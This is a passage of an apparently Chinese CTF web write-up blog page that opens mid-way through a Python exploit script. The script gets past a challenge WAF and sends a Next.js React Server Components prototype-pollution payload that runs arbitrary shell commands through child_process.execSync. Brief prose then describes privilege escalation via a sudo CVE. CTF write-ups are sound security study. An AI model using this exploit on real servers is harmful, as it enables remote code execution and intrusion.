&quot;identity&quot;&#125;,</span><br><span class="line">         )</span><br><span class="line">         with urllib.request.urlopen(req, timeout=timeout) as resp:</span><br><span class="line">             return resp.read().decode(&quot;utf-8&quot;, &quot;ignore&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def _extract_challenge(html: str) -&gt; int:</span><br><span class="line">     marker = &#x27;id=&quot;challenge&quot;&#x27;</span><br><span class="line">     idx = html.find(marker)</span><br><span class="line">     if idx == -1:</span><br><span class="line">         raise ValueError(&quot;challenge not found&quot;)</span><br><span class="line">     start = html.find(&quot;&gt;&quot;, idx)</span><br><span class="line">     end = html.find(&quot;&lt;&quot;, start + 1)</span><br><span class="line">     if start == -1 or end == -1:</span><br><span class="line">         raise ValueError(&quot;challenge parse failed&quot;)</span><br><span class="line">     return int(html[start + 1 : end])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def _factor(n: int):</span><br><span class="line">     if n % 2 == 0:</span><br><span class="line">         return 2, n // 2</span><br><span class="line">     limit = int(math.isqrt(n))</span><br><span class="line">     for i in range(3, limit + 1, 2):</span><br><span class="line">         if n % i == 0:</span><br><span class="line">             return i, n // i</span><br><span class="line">     raise ValueError(&quot;challenge not composite?&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def _build_body(cmd: str, bypass: bool = True) -&gt; bytes:</span><br><span class="line">     payload_template = (</span><br><span class="line">         &#x27;&#123;&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&#x27;</span><br><span class="line">         &#x27;&quot;value&quot;:&quot;&#123;&#123;\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;&#125;&#125;&quot;,&quot;_response&quot;:&#123;&#123;&quot;_prefix&quot;:&#x27;</span><br><span class="line">         &#x27;&quot;var res=process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;&#123;cmd&#125;\&#x27;).toString(\&#x27;base64\&#x27;);&#x27;</span><br><span class="line">         &#x27;throw Object.assign(new Error(\&#x27;x\&#x27;),&#123;&#123;digest: res&#125;&#125;);&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&#x27;</span><br><span class="line">         &#x27;&quot;_formData&quot;:&#123;&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span><br><span class="line">     )</span><br><span class="line">     json_payload = payload_template.format(cmd=cmd)</span><br><span class="line">     boundary = &quot;----NextRceMitsecOps&quot;</span><br><span class="line"> </span><br><span class="line">     if bypass:</span><br><span class="line">         part0_headers = (</span><br><span class="line">             f&quot;--&#123;boundary&#125;\r\n&quot;</span><br><span class="line">             &quot;Content-Disposition: form-data; name=\&quot;0\&quot;\r\n&quot;</span><br><span class="line">             &quot;Content-Type: text/plain; charset=utf-16le\r\n\r\n&quot;</span><br><span class="line">         ).encode(&quot;utf-8&quot;)</span><br><span class="line">         part0_content = json_payload.encode(&quot;utf-16le&quot;)</span><br><span class="line">         part1 = (</span><br><span class="line">             f&quot;\r\n--&#123;boundary&#125;\r\n&quot;</span><br><span class="line">             &quot;Content-Disposition: form-data; name=\&quot;1\&quot;\r\n\r\n&quot;</span><br><span class="line">             &#x27;&quot;$@0&quot;\r\n&#x27;</span><br><span class="line">         ).encode(&quot;utf-8&quot;)</span><br><span class="line">         part2 = (</span><br><span class="line">             f&quot;--&#123;boundary&#125;\r\n&quot;</span><br><span class="line">             &quot;Content-Disposition: form-data; name=\&quot;2\&quot;\r\n\r\n&quot;</span><br><span class="line">             &quot;[]\r\n&quot;</span><br><span class="line">             f&quot;--&#123;boundary&#125;--\r\n&quot;</span><br><span class="line">         ).encode(&quot;utf-8&quot;)</span><br><span class="line">         return part0_headers + part0_content + part1 + part2</span><br><span class="line"> </span><br><span class="line">     body = (</span><br><span class="line">         f&quot;--&#123;boundary&#125;\r\n&quot;</span><br><span class="line">         &quot;Content-Disposition: form-data; name=\&quot;0\&quot;\r\n\r\n&quot;</span><br><span class="line">         f&quot;&#123;json_payload&#125;\r\n&quot;</span><br><span class="line">         f&quot;--&#123;boundary&#125;\r\n&quot;</span><br><span class="line">         &quot;Content-Disposition: form-data; name=\&quot;1\&quot;\r\n\r\n&quot;</span><br><span class="line">         &#x27;&quot;$@0&quot;\r\n&#x27;</span><br><span class="line">         f&quot;--&#123;boundary&#125;\r\n&quot;</span><br><span class="line">         &quot;Content-Disposition: form-data; name=\&quot;2\&quot;\r\n\r\n&quot;</span><br><span class="line">         &quot;[]\r\n&quot;</span><br><span class="line">         f&quot;--&#123;boundary&#125;--\r\n&quot;</span><br><span class="line">     )</span><br><span class="line">     return body.encode(&quot;utf-8&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def _send_pipeline(host: str, port: int, path: str, cookie: str, body: bytes, timeout: float) -&gt; bytes:</span><br><span class="line">     boundary = &quot;----NextRceMitsecOps&quot;</span><br><span class="line">     get_req = (</span><br><span class="line">         f&quot;GET / HTTP/1.1\r\n&quot;</span><br><span class="line">         f&quot;Host: &#123;host&#125;:&#123;port&#125;\r\n&quot;</span><br><span class="line">         f&quot;User-Agent: &#123;UA&#125;\r\n&quot;</span><br><span class="line">         &quot;Accept: */*\r\n&quot;</span><br><span class="line">         &quot;Accept-Encoding: identity\r\n&quot;</span><br><span class="line">         &quot;Connection: keep-alive\r\n&quot;</span><br><span class="line">         f&quot;Cookie: &#123;cookie&#125;\r\n\r\n&quot;</span><br><span class="line">     )</span><br><span class="line"> </span><br><span class="line">     post_headers = (</span><br><span class="line">         f&quot;POST &#123;path&#125; HTTP/1.1\r\n&quot;</span><br><span class="line">         f&quot;Host: &#123;host&#125;:&#123;port&#125;\r\n&quot;</span><br><span class="line">         f&quot;User-Agent: &#123;UA&#125;\r\n&quot;</span><br><span class="line">         &quot;Accept: */*\r\n&quot;</span><br><span class="line">         &quot;Accept-Encoding: identity\r\n&quot;</span><br><span class="line">         &quot;Connection: close\r\n&quot;</span><br><span class="line">         # lowercase header bypass</span><br><span class="line">         &quot;next-action: x\r\n&quot;</span><br><span class="line">         f&quot;Content-Type: multipart/form-data; boundary=&#123;boundary&#125;\r\n&quot;</span><br><span class="line">         f&quot;Content-Length: &#123;len(body)&#125;\r\n&quot;</span><br><span class="line">         f&quot;Cookie: &#123;cookie&#125;\r\n\r\n&quot;</span><br><span class="line">     ).encode(&quot;utf-8&quot;)</span><br><span class="line"> </span><br><span class="line">     req_bytes = get_req.encode(&quot;utf-8&quot;) + post_headers + body</span><br><span class="line"> </span><br><span class="line">     s = socket.create_connection((host, port), timeout=timeout)</span><br><span class="line">     s.settimeout(timeout)</span><br><span class="line">     s.sendall(req_bytes)</span><br><span class="line">     chunks = []</span><br><span class="line">     while True:</span><br><span class="line">         try:</span><br><span class="line">             data = s.recv(4096)</span><br><span class="line">             if not data:</span><br><span class="line">                 break</span><br><span class="line">             chunks.append(data)</span><br><span class="line">         except socket.timeout:</span><br><span class="line">             break</span><br><span class="line">     return b&quot;&quot;.join(chunks)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def _extract_digest(resp: bytes):</span><br><span class="line">     needle = b&#x27;&quot;digest&quot;:&quot;&#x27;</span><br><span class="line">     idx = resp.rfind(needle)</span><br><span class="line">     if idx == -1:</span><br><span class="line">         return None</span><br><span class="line">     start = idx + len(needle)</span><br><span class="line">     end = resp.find(b&quot;\&quot;&quot;, start)</span><br><span class="line">     if end == -1:</span><br><span class="line">         return None</span><br><span class="line">     return resp[start:end].decode(&quot;utf-8&quot;, &quot;ignore&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def main():</span><br><span class="line">     ap = argparse.ArgumentParser(description=&quot;Next.js RSC exec helper&quot;)</span><br><span class="line">     ap.add_argument(&quot;-u&quot;, &quot;--url&quot;, default=&quot;http://nc1.ctfplus.cn:46999/&quot;, help=&quot;Target base URL&quot;)</span><br><span class="line">     ap.add_argument(&quot;-p&quot;, &quot;--path&quot;, default=&quot;/&quot;, help=&quot;POST path (default /)&quot;)</span><br><span class="line">     ap.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, required=True, help=&quot;Command to execute&quot;)</span><br><span class="line">     ap.add_argument(&quot;--no-bypass&quot;, action=&quot;store_true&quot;, help=&quot;Disable UTF-16LE WAF bypass&quot;)</span><br><span class="line">     ap.add_argument(&quot;--timeout&quot;, type=float, default=2.5, help=&quot;Socket timeout seconds&quot;)</span><br><span class="line">     ap.add_argument(&quot;--show-digest&quot;, action=&quot;store_true&quot;, help=&quot;Print raw digest string too&quot;)</span><br><span class="line">     ap.add_argument(&quot;--debug&quot;, action=&quot;store_true&quot;, help=&quot;Dump raw response to stderr&quot;)</span><br><span class="line">     args = ap.parse_args()</span><br><span class="line"> </span><br><span class="line">     parsed = urlparse(args.url)</span><br><span class="line">     if parsed.scheme != &quot;http&quot;:</span><br><span class="line">         print(&quot;Only http:// is supported by this script&quot;, file=sys.stderr)</span><br><span class="line">         sys.exit(2)</span><br><span class="line">     host = parsed.hostname or &quot;&quot;</span><br><span class="line">     port = parsed.port or 80</span><br><span class="line"> </span><br><span class="line">     html = _http_get(args.url, timeout=args.timeout)</span><br><span class="line">     challenge = _extract_challenge(html)</span><br><span class="line">     p1, p2 = _factor(challenge)</span><br><span class="line">     cookie = f&quot;waf_num_token1=&#123;p1&#125;; waf_num_token2=&#123;p2&#125;&quot;</span><br><span class="line"> </span><br><span class="line">     body = _build_body(args.cmd, bypass=not args.no_bypass)</span><br><span class="line">     resp = _send_pipeline(host, port, args.path, cookie, body, timeout=args.timeout)</span><br><span class="line"> </span><br><span class="line">     if args.debug:</span><br><span class="line">         sys.stderr.buffer.write(resp + b&quot;\n&quot;)</span><br><span class="line"> </span><br><span class="line">     raw_digest = _extract_digest(resp)</span><br><span class="line">     if raw_digest is None:</span><br><span class="line">         print(&quot;[!] digest not found&quot;, file=sys.stderr)</span><br><span class="line">         sys.exit(1)</span><br><span class="line"> </span><br><span class="line">     if args.show_digest:</span><br><span class="line">         print(raw_digest)</span><br><span class="line"> </span><br><span class="line">     pad = &quot;=&quot; * (-len(raw_digest) % 4)</span><br><span class="line">     try:</span><br><span class="line">         decoded = base64.b64decode(raw_digest + pad)</span><br><span class="line">         sys.stdout.buffer.write(decoded)</span><br><span class="line">         if not decoded.endswith(b&quot;\n&quot;):</span><br><span class="line">             sys.stdout.buffer.write(b&quot;\n&quot;)</span><br><span class="line">     except Exception:</span><br><span class="line">         # fall back to raw digest</span><br><span class="line">         print(raw_digest)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> if __name__ == &quot;__main__&quot;:</span><br><span class="line">     main()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>上去发现&#x2F;flag读不了，看见400，需要提权，发现sudo版本是1.9.15，可以打CVE-2025-32463，但是好像编译不了？（），直接在自己机器上编译好，调用python3分段解密base64成so即可。</p>
+<p>后续发现有gcc，但当时确实传的一键利用脚本没跑起来，靶机关了现在也复现不了，有点可惜。</p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://huajihd.github.io">Huaji</a>
+            <p>原文链接：<a href="http://huajihd.github.io/2026/02/03/2026UniCTF-web/">http://huajihd.github.io/2026/02/03/2026UniCTF-web/</a>
+            <p>发表日期：<a href="http://huajihd.github.io/2026/02/03/2026UniCTF-web/">February 3rd 2026, 3:17:43 pm</a>
+            <p>更新日期：<a href="http://huajihd.github.io/2026/02/03/2026UniCTF-web/">February 3rd 2026, 3:22:54 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2026/01/31/2025chixi/" title="2025下半年吃席回忆录">
+                    <div class="prevTitle">2025下半年吃席回忆录</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:2185374541@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/HuajiHD" class="iconfont-archer github" target="_blank" title="github"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UniCTF-web%E5%8D%95%E6%96%B9%E5%90%91wp"><span class="toc-number">1.</span> <span class="toc-text">UniCTF web单方向wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#secure-doc"><span class="toc-number">1.1.1.</span> <span class="toc-text">secure doc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cloudDiag"><span class="toc-number">1.1.2.</span> <span class="toc-text">cloudDiag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bytecode-Complier"><span class="toc-number">1.1.3.</span> <span class="toc-text">Bytecode Complier</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%B8%A3%E5%94%B1%E5%90%A7"><span class="toc-number">1.1.4.</span> <span class="toc-text">一鸣唱吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezUpload"><span class="toc-number">1.1.5.</span> <span class="toc-text">ezUpload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezUpload-Revenge"><span class="toc-number">1.1.6.</span> <span class="toc-text">ezUpload Revenge!!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Joomla-Revenge"><span class="toc-number">1.1.7.</span> <span class="toc-text">Joomla Revenge!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GlyphWeaver"><span class="toc-number">1.1.8.</span> <span class="toc-text">GlyphWeaver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intrasight"><span class="toc-number">1.1.9.</span> <span class="toc-text">intrasight</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjava"><span class="toc-number">1.1.10.</span> <span class="toc-text">ezjava</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gogogos"><span class="toc-number">1.1.11.</span> <span class="toc-text">gogogos</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#miowaf"><span class="toc-number">1.1.12.</span> <span class="toc-text">miowaf</span></a></li></ol></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 22
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2026 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span>
+            <a class="archive-post-title" href="/2026/02/03/2026UniCTF-web/">UniCTF web单方向wp</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/31</span>
+            <a class="archive-post-title" href="/2026/01/31/2025chixi/">2025下半年吃席回忆录</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/Pikachu/">Pikachu</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span>
+            <a class="archive-post-title" href="/2025/10/14/ycb2025-web/">羊城杯2025-web</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span>
+            <a class="archive-post-title" href="/2025/10/07/bugkuawd-10-7/">bugku-awd小记10.7</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span>
+            <a class="archive-post-title" href="/2025/08/11/fengshentai/">封神台2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week3/">NewStar CTF 2024 Web Week3复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week2/">NewStar CTF 2024 Web Week2复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/NewStar-CTF-2024-Web-Week1/">NewStar CTF 2024 Web Week1复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span>
+            <a class="archive-post-title" href="/2025/07/12/YWB2025-Final/">御网杯2025线下赛</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span>
+            <a class="archive-post-title" href="/2025/07/06/BlitzCTF-WP/">BlitzCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2025/07/02/Junior-Crypt-2025/">Junior.Crypt.2025 CTF</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span>
+            <a class="archive-post-title" href="/2025/05/18/ISCC-WP/">ISCC2025-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2025/04/20/UCSC-WP/">UCSC-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2025/04/06/XYCTF-WP/">XYCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span>
+            <a class="archive-post-title" href="/2025/02/16/EHAX-WP/">EHAX_WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span>
+            <a class="archive-post-title" href="/2025/01/27/TUCTF-WP/">TUCTF_WP</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span>
+            <a class="archive-post-title" href="/2024/12/31/SQLByPass/">sql注入绕过技巧</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span>
+            <a class="archive-post-title" href="/2024/12/25/vbsTestAutomation/">vbs自动化测试</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2024/12/06/ouc-rob-blue/">重生之我在牢山抢小蓝</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span>
+            <a class="archive-post-title" href="/2024/11/27/oucBookSeminar/">研讨室预约填写信息自动化工具</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span>
+            <a class="archive-post-title" href="/2024/10/27/oucAutoCheckIn/">ouc接龙管家自动晚打卡</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="CTF">
+                <span class="iconfont-archer">&#xe606;</span>
+                CTF
+            </span>
+            <span class="sidebar-tag-name" data-tags="吃席">
+                <span class="iconfont-archer">&#xe606;</span>
+                吃席
+            </span>
+            <span class="sidebar-tag-name" data-tags="writeups">
+                <span class="iconfont-archer">&#xe606;</span>
+                writeups
+            </span>
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+            <span class="sidebar-tag-name" data-tags="writeup">
+                <span class="iconfont-archer">&#xe606;</span>
+                writeup
+            </span>
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="青龙面板">
+                <span class="iconfont-archer">&#xe606;</span>
+                青龙面板
+            </span>
+            <span class="sidebar-tag-name" data-tags="vbs">
+                <span class="iconfont-archer">&#xe606;</span>
+                vbs
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://huajihd.github.io",
+        root: siteMetaRoot,
+        author: "Huaji"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
